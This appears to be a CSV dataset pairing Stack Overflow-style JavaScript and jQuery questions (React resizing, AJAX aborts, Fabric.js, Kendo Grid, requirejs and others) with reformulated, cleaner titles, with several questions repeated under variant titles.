originalTitle,body,reformulatedTitle
How can I fill a polygon with a texture using svg.js?," I'm currently using svg.js - but I am very welcome to alternative suggestions - is there any way I can create a polygon and then apply a repeating texture to it?Below is an example of what I am attempting to achieve. Here is a jsFiddle which shows my best attempt. This works, but the image doesn't repeat so if you increase the size of the polygon the effect is lost.I'm creating an image, and then two polygons. One for the shape and another for the shadow. I then mask the image with the polygon. The idea is that instead of creating many different shaped, coloured and textured PNG's we will be able to create one texture and use svg.js to adjust everything else.Thanks in advance :) <code>  image.maskWith(polygon.fill({color: '#FFF'}));",How can I fill a polygon with a texture using svg?
Javascript set null in Id," I have an Id City on page which is basically a model property. I want to set it as null. I am trying this to achieve it: But it is not setting the value to null.  <code>  $(""#City"").val(null); ",Setting value to null using jQuery
Reactjs - Rerender on browser resize," How can I get React to re-render the view when the browser window is resized?BackgroundI have some blocks that I want to layout individually on the page, however I also want them to update when the browser window changes. The very end result will be something like Ben Holland's Pinterest layout, but written using React not just jQuery. Im still a way off.CodeHeres my app: Then I have the Block component (equivalent to a Pin in the above Pinterest example): and the list/collection of Blocks: QuestionShould I add jQuerys window resize? If so, where? Is there a more React way of doing this? <code>  var MyApp = React.createClass({ //does the http get from the server loadBlocksFromServer: function() { $.ajax({ url: this.props.url, dataType: 'json', mimeType: 'textPlain', success: function(data) { this.setState({data: data.events}); }.bind(this) }); }, getInitialState: function() { return {data: []}; }, componentWillMount: function() { this.loadBlocksFromServer(); }, render: function() { return ( <div> <Blocks data={this.state.data}/> </div> ); }});React.renderComponent( <MyApp url=""url_here""/>, document.getElementById('view')) var Block = React.createClass({ render: function() { return ( <div class=""dp-block"" style={{left: this.props.top, top: this.props.left}}> <h2>{this.props.title}</h2> <p>{this.props.children}</p> </div> ); }}); var Blocks = React.createClass({ render: function() { //I've temporarily got code that assigns a random position //See inside the function below... var blockNodes = this.props.data.map(function (block) { //temporary random position var topOffset = Math.random() * $(window).width() + 'px'; var leftOffset = Math.random() * $(window).height() + 'px'; return <Block order={block.id} title={block.summary} left={leftOffset} top={topOffset}>{block.description}</Block>; }); return ( <div>{blockNodes}</div> ); }}); $( window ).resize(function() { // re-render the component});",Rerender view on browser resize with React
Difference between innerText and innerHTML in javascript," What is the difference between innerHTML, innerText and value in JavaScript? <code> ","Difference between innerText, innerHTML and value?"
Difference between innerText and innerHTML," What is the difference between innerHTML, innerText and value in JavaScript? <code> ","Difference between innerText, innerHTML and value?"
"Difference between innerText, innerHTML, and childNodes[].value?"," What is the difference between innerHTML, innerText and value in JavaScript? <code> ","Difference between innerText, innerHTML and value?"
Unminify / Decompress JavaScript In Visual Studio 2013," Original QuestionThis maybe a stupid question but is there a way in VS 2013 to unminify JavaScript?Just making sure we are all on the same page here. Minify: That's just an example to make sure we all know what I'm on about. As far as I can tell there is no way to be able to do this. I have only been using VS 2013 for around 3 weeks so there is probably still stuff that is hidden to me.If there is no way to do this within the program what is the next best thing for this?I did see on another similar post that recommends the site http://jsbeautifier.org/ , so may have to give that ago but would make life easier if it was built into VS 2013Thanks in advance as I know someone will be able to help me out here.Update:I have looked around VS 2013 and found nothing that can help me with this problem, like I said before they maybe some things I have missed (certain settings) so I guess if it cannot be done in VS what's the next best thing for the job? I seem to run into a fair amount of JS that is minifed and would like the quickest and best way to get the job done. I couple sites I have tried seem to have problems with it, is there a program I could install that would just allow me to short cut it with a hot-key or something. That would be pretty handy. Update 2:So I think its safe to say this cannot be done within VS2013, or for that matter at all due to missing var names and so on. So I have seen a few links and programs that allow you to format the code. Is there a way to do with within VS2013? And again if not what is the most reliable website/program that I can use to do this. Like I said I can see there have been answers and I appreciate all of them. I will be leaving this question open for a while to get more people to look at it and possibly give a better answer. Keep it up guys! Update 3:If anyone has any more information on this please do share. I am still looking around now and then waiting for someone to come up with something amazing for this. One day people.... One day! <code>  var flashVer=-1;if(navigator.plugins!=null&&navigator.plugins.length>0){if(navigator.plugins[""Shockwave Flash 2.0""]||navigator.plugins[""Shockwave Flash""]){var swVer2=navigator.plugins[""Shockwave Flash 2.0""]?""",Unminify / Decompress JavaScript
Unminify / Decompress JavaScript In Visual Studio 2013 Or Next Best Thing," Original QuestionThis maybe a stupid question but is there a way in VS 2013 to unminify JavaScript?Just making sure we are all on the same page here. Minify: That's just an example to make sure we all know what I'm on about. As far as I can tell there is no way to be able to do this. I have only been using VS 2013 for around 3 weeks so there is probably still stuff that is hidden to me.If there is no way to do this within the program what is the next best thing for this?I did see on another similar post that recommends the site http://jsbeautifier.org/ , so may have to give that ago but would make life easier if it was built into VS 2013Thanks in advance as I know someone will be able to help me out here.Update:I have looked around VS 2013 and found nothing that can help me with this problem, like I said before they maybe some things I have missed (certain settings) so I guess if it cannot be done in VS what's the next best thing for the job? I seem to run into a fair amount of JS that is minifed and would like the quickest and best way to get the job done. I couple sites I have tried seem to have problems with it, is there a program I could install that would just allow me to short cut it with a hot-key or something. That would be pretty handy. Update 2:So I think its safe to say this cannot be done within VS2013, or for that matter at all due to missing var names and so on. So I have seen a few links and programs that allow you to format the code. Is there a way to do with within VS2013? And again if not what is the most reliable website/program that I can use to do this. Like I said I can see there have been answers and I appreciate all of them. I will be leaving this question open for a while to get more people to look at it and possibly give a better answer. Keep it up guys! Update 3:If anyone has any more information on this please do share. I am still looking around now and then waiting for someone to come up with something amazing for this. One day people.... One day! <code>  var flashVer=-1;if(navigator.plugins!=null&&navigator.plugins.length>0){if(navigator.plugins[""Shockwave Flash 2.0""]||navigator.plugins[""Shockwave Flash""]){var swVer2=navigator.plugins[""Shockwave Flash 2.0""]?""",Unminify / Decompress JavaScript
Unminify / decompress JavaScript In Visual Studio 2013 (or the next best thing)," Original QuestionThis maybe a stupid question but is there a way in VS 2013 to unminify JavaScript?Just making sure we are all on the same page here. Minify: That's just an example to make sure we all know what I'm on about. As far as I can tell there is no way to be able to do this. I have only been using VS 2013 for around 3 weeks so there is probably still stuff that is hidden to me.If there is no way to do this within the program what is the next best thing for this?I did see on another similar post that recommends the site http://jsbeautifier.org/ , so may have to give that ago but would make life easier if it was built into VS 2013Thanks in advance as I know someone will be able to help me out here.Update:I have looked around VS 2013 and found nothing that can help me with this problem, like I said before they maybe some things I have missed (certain settings) so I guess if it cannot be done in VS what's the next best thing for the job? I seem to run into a fair amount of JS that is minifed and would like the quickest and best way to get the job done. I couple sites I have tried seem to have problems with it, is there a program I could install that would just allow me to short cut it with a hot-key or something. That would be pretty handy. Update 2:So I think its safe to say this cannot be done within VS2013, or for that matter at all due to missing var names and so on. So I have seen a few links and programs that allow you to format the code. Is there a way to do with within VS2013? And again if not what is the most reliable website/program that I can use to do this. Like I said I can see there have been answers and I appreciate all of them. I will be leaving this question open for a while to get more people to look at it and possibly give a better answer. Keep it up guys! Update 3:If anyone has any more information on this please do share. I am still looking around now and then waiting for someone to come up with something amazing for this. One day people.... One day! <code>  var flashVer=-1;if(navigator.plugins!=null&&navigator.plugins.length>0){if(navigator.plugins[""Shockwave Flash 2.0""]||navigator.plugins[""Shockwave Flash""]){var swVer2=navigator.plugins[""Shockwave Flash 2.0""]?""",Unminify / Decompress JavaScript
How to remove one specific seclected file from input file control," How to remove one specific selected file from input file control?I have an input file control with the option to select multiple files; however, I want to validate a file and if it has an wrong extension then I should remove that file from the file control itself, is it possible?I tried as below Below is the screenshot of the object but I am not able to modify it <code>  <input type=""file"" name=""fileToUpload"" id=""fileToUpload"" multiple/><script> $(""#fileToUpload"")[0].files[0] </script>",How to remove one specific selected file from input file control
transparency context.fillstyle in vanvas html5," I write this javascript code : I add this script on a photo , I want see the color of image , but can not add transparency to this script . <code>  context.shadowOffsetX = 5;context.shadowOffsetY = 5;context.shadowBlur = 4;context.shadowColor = 'rgba(255, 0, 0, 0.5)';context.fillStyle = '#f00';context.fillRect(x, y, w, h);",Transparency context.fill style in canvas html5
document.object_name Vs. document.getElementById()," What is the difference between these two syntaxes below-document.object and document.getElementById().I want to know when to use which syntax???e.g.-CODE1(Implementation with <form>) both the syntax in onload works the same way. But this doesn't work for the following-CODE2(Implementation with <div>) So definitely the syntax: document.object does not work with <div>-elements but works with <form>'-element. But **document.getElementById()`** works for both. So when should I use which one???Someone please highlight the differences between the two syntaxes.Thanx in advance... <code>  <body onload=""document.forms[1].innerHTML='hi';"">//Alt: onload=""document.getElementById('f1').innerHTML='hi';""<form id=f1> <input /></form><form id=f2> <input /></form></body> <body onload=""document.getElementById('div1').innerHTML='hi';"">//cannot use the syntax: onload=""document.divs[1].innerHTML='hi';""<div id=div1>hello</div><div id=div2>hello</div></body>",document.object Vs. document.getElementById()
how to work with romove clicked element in angular," HTML JS I am facing problem while deleting the element. When I am clicking a remove its removing the last element. I tried splice as well but not able to reach success.Here is a Fiddle Some concern related Angular implementations :-We need to use form action ng-submit=""addTodo()"" or we need to use <button ng-click=""addTodo(""> please differentiate.Can anyone define the proper scoping in angular with practical manner in full flex web application ?Please guide me.. Thanks !! <code>  <div ng-controller=""BlogData"" > <form ng-submit=""removeTodo()""> <ul> <li ng-repeat=""blog in bloges""> {{blog.name}} <p>{{blog.mobile}}</p> <p>{{blog.description}}</p> <input class=""btn-primary"" type=""submit"" value=""remove""> <p></p> </li> </ul> </form> <form ng-submit=""addTodo()""> <label>Name:</label><input type=""text"" ng-model=""todoName"" size=""30"" placeholder=""add your name""> <label>Mobile:</label><input type=""number"" ng-model=""todoMobile"" size=""30"" placeholder=""add your mobile""> <label>Description:</label><input type=""text"" ng-model=""todoDesc"" size=""30"" placeholder=""add some description""> <hr> <h1>Hello {{todoName }}!</h1> <h1>Your mobile is {{todoMobile}}!</h1> <h1>About my Details :- {{todoDesc}}!</h1> <input class=""btn-primary"" type=""submit"" value=""add""> </form></div> function BlogData($scope) { $scope.bloges = [ {""name"": ""Nexus S"", ""mobile"": ""858485454"", ""description"": ""The nest to seehow it works""}, {""name"": ""Motorola XOOM with Wi-Fi"", ""mobile"": ""8584453454"", ""description"": ""The nest to ytrb dsfhgs gvd m seehow it works""}, {""name"": ""MOTOROLA XOOM"", ""mobile"": ""443485454"", ""description"": ""The nest bla bla vd fg hvto seehow it works""} ]; $scope.addTodo = function() { $scope.bloges.push({name:$scope.todoName, mobile:$scope.todoMobile, description:$scope.todoDesc, done:false}); $scope.todoName = ''; $scope.todoMobile = ''; $scope.todoDesc = ''; }; $scope.removeTodo = function() { $scope.bloges.pop({name:$scope.todoName, mobile:$scope.todoMobile, description:$scope.todoDesc, done:false}); $scope.todoName = ''; $scope.todoMobile = ''; $scope.todoDesc = ''; };}var blogApp = angular.module('blogApp',[]);blogApp.controller('BlogData', BlogData);",Working with remove clicked element and scoping in angularjs
how to work with remove clicked element in angular," HTML JS I am facing problem while deleting the element. When I am clicking a remove its removing the last element. I tried splice as well but not able to reach success.Here is a Fiddle Some concern related Angular implementations :-We need to use form action ng-submit=""addTodo()"" or we need to use <button ng-click=""addTodo(""> please differentiate.Can anyone define the proper scoping in angular with practical manner in full flex web application ?Please guide me.. Thanks !! <code>  <div ng-controller=""BlogData"" > <form ng-submit=""removeTodo()""> <ul> <li ng-repeat=""blog in bloges""> {{blog.name}} <p>{{blog.mobile}}</p> <p>{{blog.description}}</p> <input class=""btn-primary"" type=""submit"" value=""remove""> <p></p> </li> </ul> </form> <form ng-submit=""addTodo()""> <label>Name:</label><input type=""text"" ng-model=""todoName"" size=""30"" placeholder=""add your name""> <label>Mobile:</label><input type=""number"" ng-model=""todoMobile"" size=""30"" placeholder=""add your mobile""> <label>Description:</label><input type=""text"" ng-model=""todoDesc"" size=""30"" placeholder=""add some description""> <hr> <h1>Hello {{todoName }}!</h1> <h1>Your mobile is {{todoMobile}}!</h1> <h1>About my Details :- {{todoDesc}}!</h1> <input class=""btn-primary"" type=""submit"" value=""add""> </form></div> function BlogData($scope) { $scope.bloges = [ {""name"": ""Nexus S"", ""mobile"": ""858485454"", ""description"": ""The nest to seehow it works""}, {""name"": ""Motorola XOOM with Wi-Fi"", ""mobile"": ""8584453454"", ""description"": ""The nest to ytrb dsfhgs gvd m seehow it works""}, {""name"": ""MOTOROLA XOOM"", ""mobile"": ""443485454"", ""description"": ""The nest bla bla vd fg hvto seehow it works""} ]; $scope.addTodo = function() { $scope.bloges.push({name:$scope.todoName, mobile:$scope.todoMobile, description:$scope.todoDesc, done:false}); $scope.todoName = ''; $scope.todoMobile = ''; $scope.todoDesc = ''; }; $scope.removeTodo = function() { $scope.bloges.pop({name:$scope.todoName, mobile:$scope.todoMobile, description:$scope.todoDesc, done:false}); $scope.todoName = ''; $scope.todoMobile = ''; $scope.todoDesc = ''; };}var blogApp = angular.module('blogApp',[]);blogApp.controller('BlogData', BlogData);",Working with remove clicked element and scoping in angularjs
Is there a way to parse json web content in firebug via console," When looking at the results of a url in my browser and I would like to open up the Developer Tools javascript console and use javascript commands to analyze the results of the page. Here's an example page:http://api.rottentomatoes.com/api/public/v1.0/movies.json?apikey=ju6z9mjyajq2djue3gbvv26t&q=deep&page_limit=2&page=1Note - I'm changing the url for this - rotten tomatoes' URL isn't public and my key expired. This example from jsontest works with the accepted answer.http://echo.jsontest.com/movies/ETIs there a way to click on this, launch the firebug console (or something similar in another browser) and parse this json string so I could use common javascript to inspect the json object.EDITJQuery is not available... <code> ",Parse json from the current page in browser developer tools console
How to disable javascript functions call from browser console?," I'm working on a web application in HTML/JavaScript, and I want to prevent users from calling functions in their browser console in order to avoid cheating. All these functions are contained in a unique file called functions.js which is loaded in the head of the index.html file.After a search on the web I found this solution, which works fine in Google Chrome, but it is inefficient in other browsers such as Firefox: Is there a general way to disable functions call from console? Does it depend on the browser or is it just a problem of scoping or maybe something else that I have ignored? <code>  var _z = console;Object.defineProperty( window, ""console"", { get : function(){if( _z._commandLineAPI ){ throw ""Script execution not permitted"" } return _z; }, set : function(val){ _z = val }});",How to disable JavaScript function calls from the browser console?
Abort previous ajax request on new request," I have a function that runs an AJAX call on the change of an input.But, there is a chance that the function will be fired again before the previous ajax call has completed.My question is, how would I abort the previous AJAX call before starting a new one?Without using a global variable. (See answer to a similar question here)JSFiddle of my current code:Javascript: HTML: <code>  var filterCandidates = function(form){ //Previous request needs to be aborted. var request = $.ajax({ type: 'POST', url: '/echo/json/', data: { json: JSON.stringify({ count: 1 }) }, success: function(data){ if(typeof data !== 'undefined'){ jQuery('.count').text(data.count) console.log(data.count); } } });};if(jQuery('#search').length > 0){ var form = jQuery('#search'); jQuery(form).find(':input').change(function() { filterCandidates(form); }); filterCandidates(form);} <form id=""search"" name=""search""> <input name=""test"" type=""text"" /> <input name=""testtwo"" type=""text"" /></form><span class=""count""></span>",Abort new AJAX request before completing the previous one
Abort previous AJAX request on new request," I have a function that runs an AJAX call on the change of an input.But, there is a chance that the function will be fired again before the previous ajax call has completed.My question is, how would I abort the previous AJAX call before starting a new one?Without using a global variable. (See answer to a similar question here)JSFiddle of my current code:Javascript: HTML: <code>  var filterCandidates = function(form){ //Previous request needs to be aborted. var request = $.ajax({ type: 'POST', url: '/echo/json/', data: { json: JSON.stringify({ count: 1 }) }, success: function(data){ if(typeof data !== 'undefined'){ jQuery('.count').text(data.count) console.log(data.count); } } });};if(jQuery('#search').length > 0){ var form = jQuery('#search'); jQuery(form).find(':input').change(function() { filterCandidates(form); }); filterCandidates(form);} <form id=""search"" name=""search""> <input name=""test"" type=""text"" /> <input name=""testtwo"" type=""text"" /></form><span class=""count""></span>",Abort new AJAX request before completing the previous one
Move selection after an DOM element," I'm currently building a Markdown editor for the web. Markdown tags are previewed in realtime by appending their HTML equivalents via the Range interface. Following code is used, which should be working according to MDN: Firefox works: Some bold textChrome not: Some bold textAny suggestions what could be wrong? Information on this subject are rare.AnswerThanks to @Tim Down, I fixed it using the invisible character workaround he describes in one of the links mentioned in is answer. This is the code I'm using now: <code>  var range = document.createRange()var selection = window.getSelection()range.setStart(textNode, start)range.setEnd(textNode, end + 2)surroundingElement = document.createElement('strong')range.surroundContents(surroundingElement)var cursorRange = document.createRange()cursorRange.setStartAfter(surroundingElement)selection.removeAllRanges()selection.addRange(cursorRange) var range = document.createRange()range.setStart(textNode, start)range.setEnd(textNode, end + 2)surroundingElement = document.createElement('strong')range.surroundContents(surroundingElement)var selection = window.getSelection()var cursorRange = document.createRange()var emptyElement = document.createTextNode('\u200B')element[0].appendChild(emptyElement)cursorRange.setStartAfter(emptyElement)selection.removeAllRanges()selection.addRange(cursorRange) ",Move selection after a DOM element
Scroll element to top of page by clicking anchor inside element or anywhere inside containing div id," I would like to scroll the page to the top of the e.g. navigation div ID when clicking either any of the links inside the navigation div ID or (if possible) when clicking anywhere into the div ID itself containing the navigation links.I have researched this and the closest I have come to is jQuery - How to scroll an anchor to the top of the page when clicked? however for some reason it does not seem to work when I try to do this in my example. What am I doing wrong? I am new to jQuery and medium at html and css (and used inline styling of the divs since I did not want to supply a separate css just for the example).When I load the html and script from jQuery - How to scroll an anchor to the top of the page when clicked? in Aptana it also does not scroll. Even with a content div above the div class work so that there is space to scroll to at all.I have included two little paragraphs inside the concerning divs to explain exactly what I mean.Any help is very much appreciated. Thank you. EDITBeware this when using scrollTop in Firefox.Animate scrollTop not working in firefoxjQuery scrollTop - no support for negative values in Mozilla / FirefoxTook me a while to figure out my code was fine but scrollTop was this issue in FF. In this same example the behaviour can also be observed. When scrolling down and making the anchors fixed, FF will scroll up to random positions either 2-4px before or after the target div.I am now using Scrolld.js to achieve pixel perfect scrolling to the desired points across major browsers. I don't understand how different browser engines can render such a common thing as scrollTop from different (either html or body) inputs as far as I understand and I am new to jQuery. Guess this is not ""the fault"" of jQuery but how the browser engines render scrollTop.  <code>  <script src=""http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script><script> $('#scroll_navigation ul li').click(function() { $('html,body').animate({scrollTop: $(this).offset().top}, 800); }); </script><body><div id=""logo"" style=""margin: 0 auto; height: 300px; width: 60%; border: 1px solid #000"">Logo</div> <div id=""scroll_navigation"" style=""margin: 0 auto; width: 40%; border: 4px solid #225599""> <p>Scroll navigation to top of page</p> <p>Catch any clicks in ""#scroll_navigation"" to scroll the div id to the top of the page</p> <div id=""navigation""> <div class=""container"" style=""margin: 0 auto; height: 220px; width: 60%; border: 1px solid #000""> <ul> <p>Catch clicks on anchors to scroll the div id to the top of the page</p> <li><a href=""#Portfolio"" title="""">Portfolio</a></li> <li><a href=""#Services"" title="""">Services</a></li> <li><a href=""#About"" title="""">About</a></li> <li><a href=""#Contact"" title="""">Contact</a></li> </ul> </div> </div> </div><div id=""content"" style=""margin: 0 auto; height: 1500px; width: 60%; border: 1px solid #000"">Content</div></body>",Scroll element to top of page by clicking anchor inside element or anywhere inside containing div id
jQuery - scroll element to top of page by clicking anchor inside element or anywhere inside containing div id," I would like to scroll the page to the top of the e.g. navigation div ID when clicking either any of the links inside the navigation div ID or (if possible) when clicking anywhere into the div ID itself containing the navigation links.I have researched this and the closest I have come to is jQuery - How to scroll an anchor to the top of the page when clicked? however for some reason it does not seem to work when I try to do this in my example. What am I doing wrong? I am new to jQuery and medium at html and css (and used inline styling of the divs since I did not want to supply a separate css just for the example).When I load the html and script from jQuery - How to scroll an anchor to the top of the page when clicked? in Aptana it also does not scroll. Even with a content div above the div class work so that there is space to scroll to at all.I have included two little paragraphs inside the concerning divs to explain exactly what I mean.Any help is very much appreciated. Thank you. EDITBeware this when using scrollTop in Firefox.Animate scrollTop not working in firefoxjQuery scrollTop - no support for negative values in Mozilla / FirefoxTook me a while to figure out my code was fine but scrollTop was this issue in FF. In this same example the behaviour can also be observed. When scrolling down and making the anchors fixed, FF will scroll up to random positions either 2-4px before or after the target div.I am now using Scrolld.js to achieve pixel perfect scrolling to the desired points across major browsers. I don't understand how different browser engines can render such a common thing as scrollTop from different (either html or body) inputs as far as I understand and I am new to jQuery. Guess this is not ""the fault"" of jQuery but how the browser engines render scrollTop.  <code>  <script src=""http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script><script> $('#scroll_navigation ul li').click(function() { $('html,body').animate({scrollTop: $(this).offset().top}, 800); }); </script><body><div id=""logo"" style=""margin: 0 auto; height: 300px; width: 60%; border: 1px solid #000"">Logo</div> <div id=""scroll_navigation"" style=""margin: 0 auto; width: 40%; border: 4px solid #225599""> <p>Scroll navigation to top of page</p> <p>Catch any clicks in ""#scroll_navigation"" to scroll the div id to the top of the page</p> <div id=""navigation""> <div class=""container"" style=""margin: 0 auto; height: 220px; width: 60%; border: 1px solid #000""> <ul> <p>Catch clicks on anchors to scroll the div id to the top of the page</p> <li><a href=""#Portfolio"" title="""">Portfolio</a></li> <li><a href=""#Services"" title="""">Services</a></li> <li><a href=""#About"" title="""">About</a></li> <li><a href=""#Contact"" title="""">Contact</a></li> </ul> </div> </div> </div><div id=""content"" style=""margin: 0 auto; height: 1500px; width: 60%; border: 1px solid #000"">Content</div></body>",Scroll element to top of page by clicking anchor inside element or anywhere inside containing div id
How to change a class CSS with Javascript?," I'm trying to set the background image of the body, but only where it uses the class banner_url. The HTML is as follows: Basically, I would like to force the page to use the following CSS instead: I am trying to do this using Greasemonkey if it makes any difference. Does anyone know how I can go about this? I started with the following, however haven't had much luck:  <code>  <body id=""app_body"" class=""banner_url desktopapp"" data-backdrop-limit=""1""> .banner_url { background: url('http://www.pxleyes.com/images/contests/kiwis/fullsize/sourceimage.jpg') no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;} function randomBG(){ document.getElementsByClassName(""banner_url"").style.backgroundImage=""url('http://www.pxleyes.com/images/contests/kiwis/fullsize/sourceimage.jpg')no-repeat center center fixed;"";} randomBG();",How to change a class CSS with a Greasemonkey/Tampermonkey script?
How to change a class CSS with a Greasemonkey script?," I'm trying to set the background image of the body, but only where it uses the class banner_url. The HTML is as follows: Basically, I would like to force the page to use the following CSS instead: I am trying to do this using Greasemonkey if it makes any difference. Does anyone know how I can go about this? I started with the following, however haven't had much luck:  <code>  <body id=""app_body"" class=""banner_url desktopapp"" data-backdrop-limit=""1""> .banner_url { background: url('http://www.pxleyes.com/images/contests/kiwis/fullsize/sourceimage.jpg') no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;} function randomBG(){ document.getElementsByClassName(""banner_url"").style.backgroundImage=""url('http://www.pxleyes.com/images/contests/kiwis/fullsize/sourceimage.jpg')no-repeat center center fixed;"";} randomBG();",How to change a class CSS with a Greasemonkey/Tampermonkey script?
What is the correct Javascript syntax to change options (like scrollable) on an existing Kendo Grid?," I've got a Kendo Grid: and then later on I want to change its scrollable property. I've tried all of the following: - - - Nothing works. How does one change whether a grid is scrollable on the fly? <code>  $('#myGrid').kendoGrid({ ... scrollable: false, ...}); $('#myGrid').data(""kendoGrid"").options.scrollable = true;$('#myGrid').data(""kendoGrid"").refresh(); $('#myGrid').data(""kendoGrid"").scrollable = true;$('#myGrid').data(""kendoGrid"").refresh(); var MyGrid = $('#myGrid').data(""kendoGrid"");MyGrid.options.scrollable = true;MyGrid.refresh(); var MyGrid = $('#myGrid').data(""kendoGrid"");MyGrid.scrollable = true;MyGrid.refresh();",What is the correct syntax to change options on an existing Kendo Grid?
grunt requirejs ignores my mainConfigFile," Project IntroMy project is a single page storefront. The project has multiple modules, and each module contains a set of controller.js, view.js and model.js files, as well as a template.html file. And uses requirejs to manage dependencies.Problem StatementI want to use mainConfigFile to provide paths to reference modules in grunt-requirejs. Part of my mainConfigFile's require.config is stored in separate file (base.dependency.config), and require.config.paths are pieced together by underscore at runtime. base.dependency.config main.js ErrorHowever, grunt requirejs is ignoring mainConfigFile, grunt requirejs tries to find 'app.js' under root, when in fact, 'app' is defined under require.config paths as my gruntFile: my file structure mainConfigFile, main.js lives in root, along with a few other application startup js filesmain bulk of application files lives inside modules foldereach module folder contains its controller, view and model js file, as well as a template.html fileEditthe gruntFile worked before, with different mainConfigFile (main.js) setup: <code>  config = { baseDependencyConfig: { paths: { ... } shim: { ... } }} var dependencies = config.baseDependencyConfig;var basePaths = config.baseDependencyConfig.paths;var extensionPaths = { // extra sets of paths};// combine base paths and extension paths at runtime using underscorevar dependencyPaths = _.extend(basePaths, extensionPaths);dependencies.paths = dependencyPaths;require.config(dependencies);// application startuprequire(['app', 'eventbus']) { // code} 'app': 'modules/base/app/base.app.controller' module.exports = function (grunt) { grunt.initConfig({ // ... other plugin config requirejs: { options: { baseUrl: 'public', // the paths for the named modules such as 'app' are defined // in main.js under require.config paths name: 'main', include: [ 'app', 'cart', 'category' ], out: 'public/build/app-optimized.js', mainConfigFile: 'public/main.js', findNestedDependencies: true, optimizeCss: 'none', cssImportIgnore: 'style/style.css, style/mocha.css', } } })} public |--modules/ | |--base/ | | |--cart | | |--category | | |--category.controller.js | | |--category.view.js | | |--category.model.js | | -category.template.html | | | --extension/ | |--style/ |--image/ |--main.js <-- main config file |--other .js files require.config({ paths: {...} shim: {...}})// application startuprequire(['app', 'eventbus']) { // code}",grunt requirejs ignores paths from my mainConfigFile
Find smallest value in Array without Math.min - JavaScript," How can I find the lowest number in an array without using Math.min.apply?  <code>  var arr = [5,1,9,5,7];",Find smallest value in Array without Math.min
In FabricJs how would I modify the object class so all sub-classes will have a new custom attribute?," I am looking for a way to extend the base fabric.Object class with a custom attribute I can save to JSON and load from JSON that would propagate all the way into the various sub classes.Specifically i want to store a depth attribute so when i load the objects from the JSON i will be able to add the appropriate parallax to the object.I imagine the solution would include modifying the fabric.Object.prototype. But i am still learning how to work with prototypes.Here is some examples of what i have tried:http://www.sitepoint.com/fabric-js-advanced/ This does a great job at giving the specific object 'rect' the attribute desired, as well as making it available in the toJSON() method. But it fails to make it available for all objects and when i use loadFromJSON() it does not contain the new attribute.Any help would be appreciated!Other resources that got me closer to a solution:Fabric.js - how to save canvas on server with custom attributes  - Creates a subclass with the custom attributes but nothing inherits from it.https://github.com/kangax/fabric.js/wiki/Adding-additional-object-properties-to-serialized-JSON  - completely rewrites the methods needed in order to include custom attributes (I would prefer not to modify the core of fabricjs) <code>  // create a rectangle objectvar rect = new fabric.Rect({ left: 100, top: 100, fill: 'red', width: 20, height: 20});rect.toObject = (function (toObject) { return function () { return fabric.util.object.extend(toObject.call(this), { depth: 10 }); };})(rect.toObject);",In Fabric.js how do I modify the object class so all sub-classes will have a new custom attribute?
jQuery checking if a checkbox is checked?, How can I check if a checkbox is checked via jQuery?Can I just add an ID or class to the element and do this? <code>  if($('#element').val() == 1) { //do stuff },checking if a checkbox is checked?
Javascript Remove All Event Listeners of Specific Type," I want to remove all event listeners of a specific type that were added using addEventListener(). All the resources I'm seeing are saying you need to do this: But I want to be able to clear it without knowing what it is currently, like this: <code>  elem.addEventListener('mousedown',specific_function);elem.removeEventListener('mousedown',specific_function); elem.addEventListener('mousedown',specific_function);elem.removeEventListener('mousedown');",Remove All Event Listeners of Specific Type
Count number of each char occurences in a string," I want to count the number of occurrences of each character in a given string using JavaScript. For example: Output should be: I tried searching Google, but didn't find any answer. I want to achieve something like this; order doesn't matter. <code>  var str = ""I want to count the number of occurances of each char in this string""; h = 4;e = 4; // and so on ",Count number of occurrences for each char in a string
